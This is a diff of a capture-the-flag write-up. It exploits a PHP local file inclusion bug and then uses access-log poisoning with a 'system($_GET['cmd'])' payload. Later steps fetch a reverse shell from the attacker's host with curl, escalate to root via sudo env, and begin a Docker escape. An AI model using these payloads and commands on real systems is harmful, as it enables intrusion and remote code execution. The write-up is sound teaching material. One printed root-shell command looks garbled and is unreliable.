@@ -23,7 +23,7 @@ I like to save the target IP as a variable called TGT which can be used in comma
 sudo nmap -sV -T4 -p- $TGT
 ```
 
-Options explained: -sV runs Version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports
+Options explained: -sV runs version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports
 
 **nmap results:**
 
@@ -47,7 +47,9 @@ In this case there is not much to be found through navigating or viewing the pag
 
 ### 1.3 Web Enumeration
 
-**Website Enumeration with gobuster** To see if there were any other useful pages I used gobuster to check for any directories as well as using `-x php` to check for php files as from the room description we know we are looking to exploit PHP.
+**Website Enumeration with gobuster**&#x20;
+
+To see if there were any other useful pages I used gobuster to check for any directories as well as using `-x php` to check for php files as from the room description we know we are looking to exploit PHP.
 
 ```bash
 gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php
@@ -56,7 +58,7 @@ gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directo
 <figure><img src="../.gitbook/assets/gobuster.PNG" alt=""><figcaption></figcaption></figure>
 
 **Points of interest from scan:**\
-index.php - Likely to show how the webpage we have seen works\
+index.php - If we can view this it will show us how the web page we have already seen works\
 flag.php - This room wants us to get the contents of these files\
 dogs/cats directory - Status code 301 means we do not have access
 
@@ -66,26 +68,24 @@ dogs/cats directory - Status code 301 means we do not have access
 
 Trying various parameters to try and exploit LFI I ran into several obstacles:
 
-1. The paramter must contain 'dog' or 'cat'
-2. .php is added to the end of the paramter (e.g /?view=index will look for the file index.php)
+1. The parameter must contain 'dog' or 'cat'
+2. .php is added to the end of the parameter (e.g /?view=index will look for the file index.php)
 
-Looking online for LFI methods I found this cheatsheet https://highon.coffee/blog/lfi-cheat-sheet/
+Looking online for LFI methods I found [this cheatsheet from high on coffee](https://highon.coffee/blog/lfi-cheat-sheet/) which gives an example of using a PHP wrapper to base64 encode a file. The example is:
 
-which gives and example of using a PHP wrapper to base64 encode a file. The example is:
-
-```
+```html
 http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 ```
 
-Applying this to our request format to view index.php we get
+Applying this to our request format trying to view index.php we get
 
 **/?view=php://filter/read=convert.base64-encode/resource=./dog/../index**
 
-Explanation: From the web enumeration we know that if we change to the dog directory (meeting the containing 'dog' in request requirement), we then need to go back up a directory to end up back at the start in order to view the index page. The .php extension for index.php is not included as we know the filter will be append .php to our request.
+Explanation: From the web enumeration we know that if we change to the dog directory (meeting the containing 'dog' in request requirement), we then need to go back up a directory to end up back at the start in order to view the index page. The .php extension for index.php is not included as we know the request will be appended with .php.
 
 ![](../.gitbook/assets/indexwebb64.PNG)
 
-This returns us the contents of index.php base64 encoded I copied the encoded text into a file on my machine and decoded it using
+This returns us the contents of index.php encoded using base64 so I copied the encoded text into a file on my machine and decoded it using:
 
 ```bash
 base64 -d indexbase64.txt
@@ -93,48 +93,57 @@ base64 -d indexbase64.txt
 
 <figure><img src="../.gitbook/assets/indexphpdecoded.PNG" alt=""><figcaption></figcaption></figure>
 
-From viewing index.php we can identify another parameter that can be set in our request. This is the **ext** value as seen in the line
+From viewing index.php we can identify another parameter that can be set in our requests. This is the **ext** value as seen in the line
 
 ```php
 $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
 ```
 
-If we do not set the ext value it defaults to .php which is an issue I encountered earlier
+If we do not set the ext value it defaults to .php which explains the issues I encountered earlier.
 
-Knowing we can read local files we can look to **read flag1** similar to how we read index.php **/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag**
+Knowing we can read local files we can look to **read flag1** similar to how we read index.php&#x20;
+
+**/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag**
 
 As before the returned base 64 needs to be decoded using `base64 -d` giving us our first flag
 
 ![](<../.gitbook/assets/flag1 Decoded.PNG>)
 
-We can also use our knowledge of the ext parameter to view /etc/passwd /?view=./dog/../../../../../../../etc/passwd\&ext
+We can also use our knowledge of the ext parameter to view /etc/passwd&#x20;
+
+**/?view=./dog/../../../../../../../etc/passwd\&ext**
+
+but this didn't turn out to be useful in my progression through the room.
 
 ### 2.3 PHP Log poisoning
 
-Now that we know how to read files on the target system we can look to view access logs which will record requests we make to the web server. From our nmap scan we know we are dealing with an Apache server V 2.4.38 which you may know the log file location of from previous experience but if not a google search can provide you with the results which is what I had to do and found the answer [here](https://phoenixnap.com/kb/apache-access-log)
+Now that we know how to read files on the target system we can look to view access logs which will record requests we make to the web server. From our nmap scan we know we are dealing with an Apache server V 2.4.38. You may know the log file location of from previous experience but if not a google search can provide you with the results which is what I had to do and found the answer [here](https://phoenixnap.com/kb/apache-access-log).
 
-**Viewing log file** Using LFI directory traversal and keeping the ext parameter blank\
+**Viewing log file**&#x20;
+
+Using LFI directory traversal and keeping the ext parameter blank\
 **/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext=**
 
 ![](../.gitbook/assets/logFileFirst.PNG)
 
-**Using curl to poison log**
+**Using curl to poison the log**
+
+As all of our requests are captured in the log file we can look to exploit this by injecting our own PHP code into the log file via a request. [This resource from sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html) gives several ways to inject PHP code into pages. Choosing one we can make a request to the site using curl:
 
 ```bash
 curl http://$TGT -H "User-Agent: <?php system(\$_GET['cmd']); ?>" 
 ```
 
-**Note**: If a php error is produced here you may need to reset your machine as the PHP is stored in log file. Once you have reset the machine input the correct curl command above making sure to use the new machine's IP.\
-For me, I had to restart my machine because the amount of requests I made with gobuster enumeration making the logs hard to view in my browser.
+**Note**: If a php error is produced here you may need to reset your machine as the PHP is now stored in log file. Once you have reset the machine input the correct curl command above making sure to use the new machine's IP.\
+For me, I had to restart my machine because the amount of requests I made with gobuster enumeration made the logs hard to view in my browser.
 
-If we know take a look at the log file again it now shows:\
-**Warning**: system(): Cannot execute a blank command in **/var/log/apache2/access.log**
-
-Note: If you are struggling to read through the log file in browser viewing the page source can help neaten it up a bit
+If we now take a look at the log file again it now shows us a **warning** 'system(): Cannot execute a blank command in /var/log/apache2/access.log**'**
 
 <figure><img src="../.gitbook/assets/phppoison warning.PNG" alt=""><figcaption><p>PHP Warning</p></figcaption></figure>
 
-This shows us that our PHP log poisoning has worked but we just haven't set our 'cmd' parameter. We can perform a quick test using the cmd `id`
+**Note**: If you are struggling to read through the log file in browser viewing the page source can help neaten it up.
+
+This warning actually shows us that our PHP log poisoning has worked, but we just haven't set our 'cmd' parameter yet. We can perform a quick test by setting cmd to `id`
 
 **/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext=\&cmd=id**
 
@@ -148,17 +157,21 @@ Set up listener on our machine for the shell to establish a connection with:
 nc -nvlp 4444
 ```
 
-**Create shell code** I used the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
+**Create shell code**&#x20;
+
+I used the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the IP to match my workstation IP and the port number to that in the netcat listener I set up above.
 
 ![](../.gitbook/assets/monkeySHell.PNG)
 
-**Get the shell onto the target** Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
+**Get the shell onto the target**&#x20;
+
+Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
 
 ```bash
 python3 -m http.server 8080 
 ```
 
-In order for the target machine to save our shell onto the machine we will use the target's curl command in the format:
+In order for the target machine to save our shell locally we will use the target's curl command in the format:
 
 ```bash
 curl http://10.14.23.1:8080/monkeyshell.php -o shell.php
@@ -166,15 +179,17 @@ curl http://10.14.23.1:8080/monkeyshell.php -o shell.php
 
 This will download monkeyshell.php and using the option -o save it as shell.php in the directory the command has been run from.
 
-Putting this curl command into our LFI URL we get the final result:
+Putting this curl command into our cmd parameter of our request we get the final result:
 
 **http://10.10.150.242/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext\&cmd=curl http://10.14.23.1:8080/monkeyshell.php -o shell.php**
 
-Our python server lets us know when our target machine has downloaded our shell:
+Our python server lets us know when our target machine has downloaded our shell file:
 
 <figure><img src="../.gitbook/assets/webdownlaod.PNG" alt=""><figcaption></figcaption></figure>
 
-**Execute the shell script** In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
+**Execute the shell script**
+
+In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
 **http://10.10.150.242/?view=./dog/../shell**
 
 <figure><img src="../.gitbook/assets/webshellFirst.PNG" alt=""><figcaption></figcaption></figure>
@@ -201,19 +216,19 @@ This returns us two results which we can `cat` out and get our first two flags (
 
 ### 4.1 Elevate to root
 
-Checking for sudo rights using `sudo -l` shows us we can run /usr/bin/env as sudo without a password. Looking this up at [GTFO Bins](https://gtfobins.github.io/gtfobins/env/#sudo) we can use the command on this site to get a root shell
+Checking for sudo rights using `sudo -l` shows us we can run /usr/bin/env as sudo without a password. Looking this up at [GTFO Bins](https://gtfobins.github.io/gtfobins/env/#sudo) we can use the command on this site to get a root shell**.**
 
 ```bash
 sudo env /bin/shpwd
 ```
 
-Running the find command as above or going straight to /root directory we can find flag 3
+Running the find command from section 3.1 or going straight to /root directory we can find flag 3
 
 ![](<../.gitbook/assets/priv esc and flag 3.PNG>)
 
 ### 4.2 Break out of the Docker Container
 
-After much trial and searching through directories I came across in /opt a file called backup.sh which appears to be a file that is called from outside the docker and is worth trying to leverage as a way to break out of the container.
+After much trial and searching through directories I came across a file in /opt/backups called backup.sh which appears to be a file that is called from outside the docker and is worth trying to leverage as a way to break out of the container.
 
 Ensuring we have another listener set up on our machine
 
